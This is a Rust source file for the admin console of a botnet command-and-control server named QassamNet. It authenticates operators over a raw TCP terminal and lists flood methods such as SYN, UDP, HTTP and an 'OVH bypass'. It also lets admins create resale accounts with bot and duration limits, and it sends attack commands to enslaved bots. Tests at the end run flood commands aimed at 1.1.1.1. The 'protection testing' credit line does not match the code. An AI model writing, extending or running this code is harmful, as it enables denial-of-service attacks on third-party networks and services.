use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    time::{timeout, Duration, sleep},
};
use thiserror::Error;

use crate::cnc::qassam_database::{QassamAccountInfo, QassamDataBase};
use crate::cnc::qassam_client_list::QassamClientList;
use crate::cnc::qassam_attack::QassamAttack;




#[derive(Error, Debug)]
pub enum QassamAdminError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Database error: {0}")]
    Database(String),
    #[error("Attack error: {0}")]
    Attack(String),
    #[error("Timeout error")]
    Timeout,
    #[error("Authentication failed")]
    AuthFailed,
    #[error("Invalid command: {0}")]
    InvalidCommand(String),
    #[error("Connection closed")]
    ConnectionClosed,
    #[error("UTF-8 error: {0}")]
    Utf8(#[from] std::string::FromUtf8Error),
}


#[derive(Error, Debug)]
pub struct QassamAdmin {
    conn: TcpStream,
    database: std::sync::Arc<QassamDataBase>,
    client_list: std::sync::Arc<QassamClientList>,
    username: String,
    user_info: Option<QassamAccountInfo>,
}

impl std::fmt::Display for QassamAdmin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "QassamAdmin(username: {})", self.username)
    }
}

impl QassamAdmin {
    pub fn qassam_new(conn: TcpStream, database: std::sync::Arc<QassamDataBase>, client_list: std::sync::Arc<QassamClientList>) -> Self {
        QassamAdmin {
            conn,
            database,
            client_list,
            username: String::new(),
            user_info: None,
        }
    }

    pub async fn qassam_handle(mut self) -> Result<(), QassamAdminError> {
        // Switch to alternate buffer
        self.qassam_write_all(b"\x1b[?1049h").await?;
        self.qassam_write_all(b"\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22").await?;

        // Аутентификация
        if let Err(e) = self.qassam_authenticate().await {
            self.qassam_write_all(b"\r\n\x1b[91mAuthentication failed\x1b[0m\r\n").await?;
            let _ = self.qassam_write_all(b"\x1b[?1049l").await;
            return Err(e);
        }

        // Запуск фоновой задачи для обновления заголовка
        let title_handle = self.qassam_start_title_updater();

        // Приветственное сообщение
        self.qassam_show_welcome_message().await?;

        // Основной цикл обработки команд
        let result = self.qassam_command_loop().await;

        // Останавливаем фоновую задачу
        drop(title_handle);

        // Восстанавливаем терминал
        let _ = self.qassam_write_all(b"\x1b[?1049l").await;

        result
    }

    async fn qassam_authenticate(&mut self) -> Result<(), QassamAdminError> {
        // Получение имени пользователя
        self.qassam_write_all(b"\x1b[37m\r\n").await?;
        self.qassam_write_all(b"\x1b[93mUsername \x1b[37m> \x1b[37m").await?;

        let username = self.qassam_readline_with_timeout(false, Duration::from_secs(120)).await?;

        // Получение пароля
        self.qassam_write_all(b"\x1b[93mPassword \x1b[37m> \x1b[37m").await?;
        let password = self.qassam_readline_with_timeout(true, Duration::from_secs(120)).await?;

        // Анимация проверки
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_show_verification_animation().await?;
        self.qassam_write_all(b"\r\n").await?;

        // Проверка учетных данных
        let (logged_in, user_info) = self.database.qassam_try_login(&username, &password)
            .map_err(|e| QassamAdminError::Database(e.to_string()))?;

        if !logged_in {
            self.qassam_write_all(b"\x1b[2J\x1b[1;1H").await?;
            self.qassam_write_all(b"\r\x1b[91m[!] Invalid login!\r\n").await?;
            self.qassam_write_all(b"\x1b[91mPress any key to exit\x1b[0m").await?;

            let mut buf = [0u8; 1];
            let _ = self.conn.read(&mut buf).await;
            return Err(QassamAdminError::AuthFailed);
        }

        self.username = username;
        self.user_info = Some(user_info);
        self.qassam_write_all(b"\r\n\x1b[0m").await?;
        Ok(())
    }

    async fn qassam_show_verification_animation(&mut self) -> Result<(), QassamAdminError> {
        let spin_buf = [b'-', b'\\', b'|', b'/'];
        for i in 0..15 {
            let message = format!("\r\x1b[01;36m\x1b[01;36mVerify \x1b[01;37m{}", spin_buf[i % spin_buf.len()] as char);
            self.qassam_write_all(message.as_bytes()).await?;
            sleep(Duration::from_millis(300)).await;
        }
        Ok(())
    }

    fn qassam_start_title_updater(&self) -> tokio::task::JoinHandle<()> {
        // Создаем новый TcpStream для фоновой задачи
        let mut conn = match self.qassam_duplicate_connection() {
            Ok(conn) => conn,
            Err(_) => return tokio::spawn(async {})
        };

        let username = self.username.clone();
        let user_info = match &self.user_info {
            Some(info) => info.clone(),
            None => return tokio::spawn(async {}),
        };
        let client_list = std::sync::Arc::clone(&self.client_list);

        tokio::spawn(async move {
            let mut i = 0;
            loop {
                let bot_count = match client_list.qassam_count().await {
                    Ok(count) => count,
                    Err(_) => break,
                };

                let display_count = if user_info.max_bots != -1 && bot_count > user_info.max_bots {
                    user_info.max_bots
                } else {
                    bot_count
                };

                sleep(Duration::from_secs(1)).await;

                let title = format!("\x1b]0;{} - Loaded: {}\x07", username, display_count);
                if conn.write_all(title.as_bytes()).await.is_err() {
                    break;
                }

                i += 1;
                if i % 60 == 0 {
                    let _ = conn.readable().await;
                }
            }
        })
    }

    // Метод для дублирования соединения
    fn qassam_duplicate_connection(&self) -> Result<TcpStream, std::io::Error> {
        use std::os::unix::io::{AsRawFd, FromRawFd};

        unsafe {
            let fd = self.conn.as_raw_fd();
            let new_fd = libc::dup(fd);

            if new_fd == -1 {
                return Err(std::io::Error::last_os_error());
            }

            let std_stream = std::net::TcpStream::from_raw_fd(new_fd);

            // Правильная конвертация std::net::TcpStream в tokio::net::TcpStream
            match tokio::net::TcpStream::from_std(std_stream) {
                Ok(tokio_stream) => Ok(tokio_stream),
                Err(e) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
            }
        }
    }

    async fn qassam_show_welcome_message(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\x1b[2J\x1b[1H").await?;
        self.qassam_write_all(b"\x1b[1;36mWelcome to QassamNet!\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mType HELP to see all commands\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        Ok(())
    }

    async fn qassam_command_loop(&mut self) -> Result<(), QassamAdminError> {
        // Клонируем user_info, чтобы не держать ссылку на self
        let user_info = self.user_info.as_ref()
            .ok_or(QassamAdminError::AuthFailed)?
            .clone();

        loop {
            let prompt = format!("\x1b[1;36m[{} \x1b[1;37m@ \x1b[1;36mqassamnet\x1b[1;37m]\x1b[0m ", self.username);
            self.qassam_write_all(prompt.as_bytes()).await?;

            let cmd = match self.qassam_readline_with_timeout(false, Duration::from_secs(300)).await {
                Ok(cmd) => cmd,
                Err(QassamAdminError::Timeout) => {
                    self.qassam_write_all(b"\r\n\x1b[91mSession timeout\x1b[0m\r\n").await?;
                    break;
                }
                Err(e) => return Err(e),
            };

            if cmd.is_empty() {
                continue;
            }

            match self.qassam_process_command(&cmd, &user_info).await {
                Ok(should_continue) => {
                    if !should_continue {
                        break;
                    }
                }
                Err(e) => {
                    let error_msg = format!("\r\n\x1b[91mError: {}\x1b[0m\r\n", e);
                    self.qassam_write_all(error_msg.as_bytes()).await?;
                }
            }
        }

        Ok(())
    }

    async fn qassam_process_command(&mut self, cmd: &str, user_info: &QassamAccountInfo) -> Result<bool, QassamAdminError> {
        match cmd.to_lowercase().as_str() {
            "exit" | "quit" | "out" => return Ok(false),
            "help" => self.qassam_show_help_menu().await?,
            "methods" | "?" => self.qassam_show_methods().await?,
            "bots" => self.qassam_show_bots().await?,
            "clear" => self.qassam_clear_screen().await?,
            "credits" | "credit" => self.qassam_show_credits().await?,
            "admin" if user_info.admin == 1 => self.qassam_show_admin_menu().await?,
            "adduser" if user_info.admin == 1 => self.qassam_handle_add_user().await?,
            _ => self.qassam_handle_attack_command(cmd, user_info).await?,
        }
        Ok(true)
    }

    // ... остальные методы остаются без изменений ...
    async fn qassam_show_help_menu(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mMETHODS\x1b[1;31m: \x1b[0mShow all attack methods\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mBOTS\x1b[1;31m: \x1b[0mShow bot count and distribution\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mCLEAR\x1b[1;31m: \x1b[0mClear terminal\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mCREDITS\x1b[1;31m: \x1b[0mShow credits\r\n").await?;
        if self.user_info.as_ref().map_or(false, |info| info.admin == 1) {
            self.qassam_write_all(b"\x1b[1;36mADMIN\x1b[1;31m: \x1b[0mAdmin commands\r\n").await?;
        }
        self.qassam_write_all(b"\r\n").await?;
        Ok(())
    }

    async fn qassam_show_methods(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mPreset\x1b[1;31m:\x1b[1;31m !stdflood <target> <time>\x1b[0m\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mExample\x1b[1;31m:\x1b[1;31m !stdflood 1.1.1.1 30 dport=80 len=1400\x1b[0m\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36mExample\x1b[1;31m:\x1b[1;31m !httpflood 1.1.1.1 30 domain=1.1.1.1 path=/ conns=500\x1b[0m\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m tcpflood\x1b[1;31m: \x1b[0mTCP flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m customflood\x1b[1;31m: \x1b[0mCUSTOM UDP flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m stdflood\x1b[1;31m: \x1b[0mSTD flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m fragflood\x1b[1;31m: \x1b[0mTCP FRAG Packet Flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m vseflood\x1b[1;31m: \x1b[0mVSE flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m ackflood\x1b[1;31m: \x1b[0mACK flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m stompflood\x1b[1;31m: \x1b[0mTCP STOMP flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m synflood\x1b[1;31m: \x1b[0mTCP SYN flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m ovhbypass\x1b[1;31m: \x1b[0mOVH UDP Hex flood\r\n").await?;
        self.qassam_write_all(b"\x1b[1;36m httpflood\x1b[1;31m: \x1b[0mHTTP flood\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        Ok(())
    }

    async fn qassam_show_bots(&mut self) -> Result<(), QassamAdminError> {
        let distribution = self.client_list.qassam_distribution().await
            .map_err(|e| QassamAdminError::InvalidCommand(e.to_string()))?;
        let total_bots = self.client_list.qassam_count().await
            .map_err(|e| QassamAdminError::InvalidCommand(e.to_string()))?;

        self.qassam_write_all(b"\r\n").await?;
        for (source, count) in distribution {
            let line = format!("\x1b[1;34m{}: \x1b[1;35m{}\x1b[0m\r\n", source, count);
            self.qassam_write_all(line.as_bytes()).await?;
        }
        let total_line = format!("\x1b[1;34mTotal bots: \x1b[1;34m[\x1b[1;35m{}\x1b[1;34m]\r\n\x1b[0m", total_bots);
        self.qassam_write_all(total_line.as_bytes()).await?;
        Ok(())
    }

    async fn qassam_clear_screen(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\x1b[2J\x1b[1H").await?;
        Ok(())
    }

    async fn qassam_show_credits(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\x1b[01;37mQassamNet - Advanced DDoS Protection Testing Tool\r\n").await?;
        self.qassam_write_all(b"\x1b[01;37mDeveloped by the Qassam Team\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        Ok(())
    }

    async fn qassam_show_admin_menu(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"\r\n").await?;
        self.qassam_write_all(b"\x1b[01;37m \x1b[1;34madduser \x1b[1;31m-> \x1b[1;35mAdd normal user\r\n").await?;
        self.qassam_write_all(b"\r\n").await?;
        Ok(())
    }

    async fn qassam_handle_add_user(&mut self) -> Result<(), QassamAdminError> {
        self.qassam_write_all(b"Enter new username: ").await?;
        let username = self.qassam_readline_with_timeout(false, Duration::from_secs(60)).await?;

        self.qassam_write_all(b"Enter new password: ").await?;
        let password = self.qassam_readline_with_timeout(true, Duration::from_secs(60)).await?;

        self.qassam_write_all(b"Enter max bots (-1 for unlimited): ").await?;
        let max_bots_str = self.qassam_readline_with_timeout(false, Duration::from_secs(60)).await?;
        let max_bots: i32 = max_bots_str.parse()
            .map_err(|_| QassamAdminError::InvalidCommand("Invalid bot count".to_string()))?;

        self.qassam_write_all(b"Enter max duration (-1 for unlimited): ").await?;
        let duration_str = self.qassam_readline_with_timeout(false, Duration::from_secs(60)).await?;
        let duration: i32 = duration_str.parse()
            .map_err(|_| QassamAdminError::InvalidCommand("Invalid duration".to_string()))?;

        self.qassam_write_all(b"Enter cooldown (0 for none): ").await?;
        let cooldown_str = self.qassam_readline_with_timeout(false, Duration::from_secs(60)).await?;
        let cooldown: i32 = cooldown_str.parse()
            .map_err(|_| QassamAdminError::InvalidCommand("Invalid cooldown".to_string()))?;

        let summary = format!(
            "\r\nNew account info:\r\nUsername: {}\r\nPassword: {}\r\nMax bots: {}\r\nContinue? (y/N): ",
            username, password, max_bots_str
        );
        self.qassam_write_all(summary.as_bytes()).await?;

        let confirm = self.qassam_readline_with_timeout(false, Duration::from_secs(60)).await?;
        if confirm.to_lowercase() != "y" {
            self.qassam_write_all(b"\r\nOperation cancelled.\r\n").await?;
            return Ok(());
        }

        match self.database.qassam_create_user(&username, &password, max_bots, duration, cooldown) {
            Ok(true) => {
                self.qassam_write_all(b"\r\n\x1b[32;1mUser added successfully.\x1b[0m\r\n").await?;
            }
            Ok(false) => {
                self.qassam_write_all(b"\r\n\x1b[31;1mUsername already exists.\x1b[0m\r\n").await?;
            }
            Err(e) => {
                let error_msg = format!("\r\n\x1b[31;1mFailed to create user: {}\x1b[0m\r\n", e);
                self.qassam_write_all(error_msg.as_bytes()).await?;
            }
        }

        Ok(())
    }

    async fn qassam_handle_attack_command(&mut self, cmd: &str, user_info: &QassamAccountInfo) -> Result<(), QassamAdminError> {
        let (actual_cmd, bot_count, bot_category) = self.qassam_parse_command_prefixes(cmd, user_info);

        if actual_cmd.is_empty() {
            return Err(QassamAdminError::InvalidCommand("Empty command after prefixes".to_string()));
        }

        // Создание атаки
        let attack = QassamAttack::qassam_new(&actual_cmd, user_info.admin)
            .map_err(|e| QassamAdminError::Attack(e.to_string()))?;

        let attack_buf = attack.qassam_build()
            .map_err(|e| QassamAdminError::Attack(e.to_string()))?;

        // Проверка возможности запуска атаки
        if !self.database.qassam_can_launch_attack(
            &self.username,
            attack.duration,
            &actual_cmd,
            bot_count,
            0
        ).map_err(|e| QassamAdminError::Database(e.to_string()))? {
            return Err(QassamAdminError::InvalidCommand("Cannot launch attack".to_string()));
        }

        // Отправка атаки
        self.client_list.qassam_queue_buf(attack_buf, bot_count, &bot_category).await
            .map_err(|e| QassamAdminError::InvalidCommand(e.to_string()))?;

        let sent_count = if bot_count == -1 {
            self.client_list.qassam_count().await.unwrap_or(0)
        } else {
            std::cmp::min(bot_count, user_info.max_bots)
        };

        let success_msg = format!(
            "\r\n\x1b[1;31mAttack has been sent to \x1b[1;32m{}\x1b[1;31m bots\r\n\x1b[0m",
            sent_count
        );
        self.qassam_write_all(success_msg.as_bytes()).await?;

        Ok(())
    }

    fn qassam_parse_command_prefixes(&self, cmd: &str, user_info: &QassamAccountInfo) -> (String, i32, String) {
        let mut actual_cmd = cmd.to_string();
        let mut bot_count = user_info.max_bots;
        let mut bot_category = String::new();

        // Обработка префикса количества ботов (*)
        if actual_cmd.starts_with('*') {
            if let Some(space_pos) = actual_cmd.find(' ') {
                let count_str = &actual_cmd[1..space_pos];
                if let Ok(count) = count_str.parse::<i32>() {
                    if user_info.max_bots == -1 || count <= user_info.max_bots {
                        bot_count = count;
                    }
                    actual_cmd = actual_cmd[space_pos + 1..].to_string();
                }
            }
        }

        // Обработка префикса категории ботов (-)
        if actual_cmd.starts_with('-') {
            if let Some(space_pos) = actual_cmd.find(' ') {
                bot_category = actual_cmd[1..space_pos].to_string();
                actual_cmd = actual_cmd[space_pos + 1..].to_string();
            }
        }

        (actual_cmd, bot_count, bot_category)
    }

    async fn qassam_readline_with_timeout(&mut self, masked: bool, timeout_duration: Duration) -> Result<String, QassamAdminError> {
        let mut buf = Vec::with_capacity(1024);

        loop {
            let mut byte = [0u8];

            match timeout(timeout_duration, self.conn.read_exact(&mut byte)).await {
                Ok(Ok(_)) => {}
                Ok(Err(e)) => return Err(QassamAdminError::Io(e)),
                Err(_) => return Err(QassamAdminError::Timeout),
            }

            match byte[0] {
                0xFF => {
                    // Пропускаем IAC команды
                    let mut two_bytes = [0u8; 2];
                    if timeout(timeout_duration, self.conn.read_exact(&mut two_bytes)).await.is_err() {
                        return Err(QassamAdminError::Timeout);
                    }
                }
                0x7F | 0x08 => { // Backspace/Delete
                    if !buf.is_empty() {
                        self.conn.write_all(&[0x08, b' ', 0x08]).await?;
                        buf.pop();
                    }
                }
                b'\r' | b'\t' => {
                    // Игнорируем
                }
                b'\n' | 0x00 => {
                    self.qassam_write_all(b"\r\n").await?;
                    return Ok(String::from_utf8(buf)?);
                }
                0x03 => { // Ctrl+C
                    self.qassam_write_all(b"^C\r\n").await?;
                    return Ok(String::new());
                }
                _ => {
                    if byte[0] == 0x1B {
                        // Escape sequence
                        buf.push(b'^');
                        buf.push(b'[');
                        if masked {
                            self.qassam_write_all(b"^[").await?;
                        } else {
                            self.qassam_write_all(b"^[").await?;
                        }
                    } else {
                        buf.push(byte[0]);
                        if masked {
                            self.qassam_write_all(b"*").await?;
                        } else {
                            self.qassam_write_all(&byte).await?;
                        }
                    }
                }
            }
        }
    }

    async fn qassam_write_all(&mut self, buf: &[u8]) -> Result<(), QassamAdminError> {
        self.conn.write_all(buf).await?;
        self.conn.flush().await?;
        Ok(())
    }
}






#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpListener;
    use std::sync::Arc;

    // Простые mock структуры для тестирования
    #[derive(Default)]
    struct MockDatabase;

    impl MockDatabase {
        fn new() -> Arc<QassamDataBase> {
            // Создаем заглушку с минимальными параметрами
            Arc::new(QassamDataBase::qassam_new("localhost", "test", "test", "test").unwrap())
        }
    }

    #[derive(Default)]
    struct MockClientList;

    impl MockClientList {
        async fn new() -> Arc<QassamClientList> {
            // Создаем заглушку
            Arc::new(QassamClientList::new().await.unwrap())
        }
    }

    // Вспомогательная функция для создания тестового администратора
    async fn create_test_admin() -> QassamAdmin {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let client = TcpStream::connect(addr).await.unwrap();
        let _server = listener.accept().await.unwrap(); // Принимаем соединение

        QassamAdmin::qassam_new(
            client,
            MockDatabase::new(),
            MockClientList::new().await,
        )
    }

    // Создание тестового пользователя
    fn create_test_user_info() -> QassamAccountInfo {
        QassamAccountInfo {
            username: "testuser".to_string(),
            max_bots: 100,
            admin: 1,
        }
    }

    #[tokio::test]
    async fn test_admin_creation() {
        let admin = create_test_admin().await;

        assert!(admin.username.is_empty());
        assert!(admin.user_info.is_none());
    }

    #[tokio::test]
    async fn test_parse_command_prefixes() {
        let admin = create_test_admin().await;
        let user_info = create_test_user_info();

        // Тест без префиксов
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("!stdflood 1.1.1.1 60", &user_info);
        assert_eq!(cmd, "!stdflood 1.1.1.1 60");
        assert_eq!(count, 100);
        assert_eq!(category, "");

        // Тест с префиксом количества
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("*50 !stdflood 1.1.1.1 60", &user_info);
        assert_eq!(cmd, "!stdflood 1.1.1.1 60");
        assert_eq!(count, 50);
        assert_eq!(category, "");

        // Тест с префиксом категории
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("-windows !stdflood 1.1.1.1 60", &user_info);
        assert_eq!(cmd, "!stdflood 1.1.1.1 60");
        assert_eq!(count, 100);
        assert_eq!(category, "windows");
    }

    #[tokio::test]
    async fn test_error_types() {
        // Просто проверяем, что ошибки создаются корректно
        let io_error = QassamAdminError::Io(std::io::Error::new(std::io::ErrorKind::Other, "test"));
        let timeout_error = QassamAdminError::Timeout;
        let auth_error = QassamAdminError::AuthFailed;

        assert!(matches!(io_error, QassamAdminError::Io(_)));
        assert!(matches!(timeout_error, QassamAdminError::Timeout));
        assert!(matches!(auth_error, QassamAdminError::AuthFailed));
    }

    #[tokio::test]
    async fn test_write_all() {
        let mut admin = create_test_admin().await;

        // Простой тест записи - должен работать без ошибок
        let result = admin.qassam_write_all(b"test").await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_verification_animation() {
        let mut admin = create_test_admin().await;

        // Проверяем что функция выполняется
        let result = admin.qassam_show_verification_animation().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_welcome_message() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_show_welcome_message().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_help_menu() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_show_help_menu().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_methods_menu() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_show_methods().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_admin_menu() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_show_admin_menu().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_credits() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_show_credits().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_clear_screen() {
        let mut admin = create_test_admin().await;

        let result = admin.qassam_clear_screen().await;
        assert!(result.is_ok());
    }

    // Простой тест на парсинг граничных случаев
    #[tokio::test]
    async fn test_parse_edge_cases() {
        let admin = create_test_admin().await;
        let user_info = create_test_user_info();

        // Пустая команда
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("", &user_info);
        assert_eq!(cmd, "");
        assert_eq!(count, 100);
        assert_eq!(category, "");

        // Только префикс количества
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("*50", &user_info);
        assert_eq!(cmd, "*50");
        assert_eq!(count, 100);
        assert_eq!(category, "");

        // Только префикс категории
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("-linux", &user_info);
        assert_eq!(cmd, "-linux");
        assert_eq!(count, 100);
        assert_eq!(category, "");
    }

    // Тест на превышение лимита ботов
    #[tokio::test]
    async fn test_bot_limit() {
        let admin = create_test_admin().await;
        let user_info = create_test_user_info();

        // Префикс превышает максимальное количество ботов
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("*150 !stdflood 1.1.1.1 60", &user_info);
        assert_eq!(cmd, "!stdflood 1.1.1.1 60");
        assert_eq!(count, 100); // Должен ограничиться max_bots
        assert_eq!(category, "");
    }

    // Тест на некорректный ввод
    #[tokio::test]
    async fn test_invalid_input() {
        let admin = create_test_admin().await;
        let user_info = create_test_user_info();

        // Некорректный префикс количества
        let (cmd, count, category) = admin.qassam_parse_command_prefixes("*invalid !stdflood 1.1.1.1 60", &user_info);
        assert_eq!(cmd, "*invalid !stdflood 1.1.1.1 60");
        assert_eq!(count, 100);
        assert_eq!(category, "");
    }

    // Упрощенные тесты для process_command - проверяем только что не паникует
    #[tokio::test]
    async fn test_process_command_basic_commands() {
        let mut admin = create_test_admin().await;
        let user_info = create_test_user_info();

        // Просто проверяем что функции не паникуют
        let _ = admin.qassam_process_command("exit", &user_info).await;
        let _ = admin.qassam_process_command("help", &user_info).await;
        let _ = admin.qassam_process_command("methods", &user_info).await;
        let _ = admin.qassam_process_command("bots", &user_info).await;
        let _ = admin.qassam_process_command("clear", &user_info).await;
        let _ = admin.qassam_process_command("credits", &user_info).await;
    }

    #[tokio::test]
    async fn test_process_command_admin_commands() {
        let mut admin = create_test_admin().await;
        let mut user_info = create_test_user_info();

        // Просто проверяем что функции не паникуют
        let _ = admin.qassam_process_command("admin", &user_info).await;
        let _ = admin.qassam_process_command("adduser", &user_info).await;

        user_info.admin = 0;
        let _ = admin.qassam_process_command("admin", &user_info).await;
        let _ = admin.qassam_process_command("adduser", &user_info).await;
    }
}
